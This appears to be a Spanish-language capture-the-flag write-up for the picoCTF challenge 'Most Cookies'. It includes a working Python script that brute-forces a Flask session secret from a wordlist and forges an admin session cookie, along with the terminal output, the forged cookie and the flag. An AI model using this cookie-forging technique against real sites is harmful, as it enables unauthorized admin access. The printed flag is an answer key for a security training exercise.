
## Most Cookies
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py) [http://mercury.picoctf.net:53700/](http://mercury.picoctf.net:53700/)


Hints:
1. How secure is a flask cookie?


## Solución:
```

`picoCTF{pwn_4ll_th3_cook1E5_3646b931}`
Solución:
Entrar y registrarse con: 
eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_LAdA.XQ-qsR4VHOgo--OyDArMkLc20rk


Después: Descargar server.py y copiar las galletas
["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap",
"shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss",
"biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel",
"wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie",
 "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
 


Siguientes partes:Usar este código y correrlo:

import flask
import hashlib

from sys import argv
from flask.json.tag import TaggedJSONSerializer
from itsdangerous import URLSafeTimedSerializer, TimestampSigner, BadSignature

cookie = argv[1]

cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap",
"shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss",
"biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel",
"wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie",
 "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
real_secret = ''

for secret in cookie_names:
        try:
                serializer = URLSafeTimedSerializer(
                        secret_key=secret,
                        salt='cookie-session',
                        serializer=TaggedJSONSerializer(),
                        signer=TimestampSigner,
                        signer_kwargs={
                                'key_derivation' : 'hmac',
                                'digest_method' : hashlib.sha1
                }).loads(cookie)
        except BadSignature:
                continue

        print(f'Secret key: {secret}')
        real_secret = secret

session = {'very_auth' : 'admin'}

print(URLSafeTimedSerializer(
        secret_key=real_secret,
        salt='cookie-session',
        serializer=TaggedJSONSerializer(),
        signer=TimestampSigner,
        signer_kwargs={
                'key_derivation' : 'hmac',
                'digest_method' : hashlib.sha1
        }
).dumps(session))








Correrlo con:  python3 solucion.py eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_LAdA.XQ-qsR4VHOgo--OyDArMkLc20rk

(.venv) brisguz@DESKTOP-8V24E1B:~/Fun_Seg_Red$ python3 solucion.py eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_LAdA.XQ-qsR4VHOgo--OyDArMkLc20rk
Secret key: peanut butter
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_LFvQ.pp8IGWPiXwusMR53sQaN6JX85Uc



Copiar el resultado que dio, después cambiar la galleta y actualizar:
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_LFvQ.pp8IGWPiXwusMR53sQaN6JX85Uc

Y darle guardar y actualizar
**Flag**: `picoCTF{pwn_4ll_th3_cook1E5_3646b931}`


```

